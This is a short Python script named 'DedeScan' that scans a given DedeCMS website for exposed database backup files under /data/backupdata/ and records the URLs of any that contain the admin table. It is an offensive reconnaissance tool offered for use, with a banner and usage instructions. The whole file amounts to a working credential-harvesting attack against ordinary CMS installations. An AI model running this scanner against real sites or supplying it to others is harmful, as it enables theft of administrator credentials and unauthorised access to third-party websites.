import requests
import time
import sys

def banner():
    print(
"""
  ____           _      ____                  
 |  _ \  ___  __| | ___/ ___|  ___ __ _ _ __  
 | | | |/ _ \/ _` |/ _ \___ \ / __/ _` | '_ \ 
 | |_| |  __/ (_| |  __/___) | (_| (_| | | | |
 |____/ \___|\__,_|\___|____/ \___\__,_|_| |_|
\n\t\tAuthor:RG Date:2020/4/5"""
    )

def useage():
    banner()
    print("Useage:python3 {0} [url] [tablePrefix default:dede]".format(sys.argv[0]))

def getpass(url,prefix="dede"):
    for num in range(1,5):
        try:
            url2=url.strip()+"/data/backupdata/{prefix}_a~{num}.txt".format(prefix=prefix,num=num)
            res=requests.get(url2,timeout=3)
            if res.status_code==200 and "dede" in res.text:
                if len(res.text)>1000:
                    pass
                else:
                    if "_admin`" in res.text:
                        print("[+]Get admin at:",url2)
                        f=open("OK.txt","a")
                        f.write(url2+"\n")
                        f.close()
                        break
                pass
            else:
                break
            pass
        except:
            print("[!]Network Error")
if __name__=="__main__":
    if len(sys.argv) == 1:
        useage()
    else:
        banner()
        if len(sys.argv) == 3:
            getpass(sys.argv[1],sys.argv[2])
        else:
            getpass(sys.argv[1])
